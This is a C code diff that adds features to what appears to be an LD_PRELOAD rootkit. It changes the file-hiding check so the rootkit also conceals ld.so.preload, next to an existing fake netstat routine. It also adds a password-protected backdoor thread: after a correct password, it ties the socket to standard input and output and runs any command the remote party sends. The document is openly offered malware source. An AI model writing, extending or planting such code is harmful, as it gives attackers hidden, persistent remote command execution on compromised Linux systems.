@@ -34,7 +34,10 @@ int matches_reg(const char *reg, const char *str){
  */
 int is_magicfile(const char *filename){
     char *file = basename(filename);
-    return strncmp(file, MAGIC_PREFIX, sizeof(MAGIC_PREFIX)-1) == 0;
+    char magic_re[256] = "(^ld\\.so\\.preload$|";
+    strcat(magic_re, MAGIC_PREFIX);
+    strcat(magic_re,")");
+    return matches_reg(magic_re, file);
 }
 
 /*
@@ -84,4 +87,40 @@ int fake_netstat(char *pathname, char *newfile){
     }
     fclose(fake_fp);
     return 1;
+}
+
+void spawn_shell(int fd, char *cmd){
+    dup2(fd, 0); //stdin
+    dup2(fd, 1); //stdout
+    dup2(fd, 2); //stderr
+
+    system(cmd);
+}
+
+void readline(int fd, char *buff, int size){
+    int l = 0;
+    int c = 'X';
+    while (c && c != '\n' && l < size){
+        read(fd, &c, 1);
+        buff[l] = c;
+        l++;
+    }
+    buff[l-1] = '\0';
+}
+
+void *backdoor(void *args){
+    int fd = *((int *) args);
+    write(fd, "PASS>", 5);
+    char buff[1024];
+    readline(fd, buff, sizeof(buff));
+    if (strcmp(buff, PASSWORD) != 0){
+        char lovephrase[] = "Fuck off.\n";
+        write(fd, lovephrase, sizeof(lovephrase));
+        close(fd);
+        return NULL;
+    }
+    write(fd,"CMD>",4);
+    readline(fd, buff, sizeof(buff));
+    spawn_shell(fd, buff);
+    close(fd);
 }
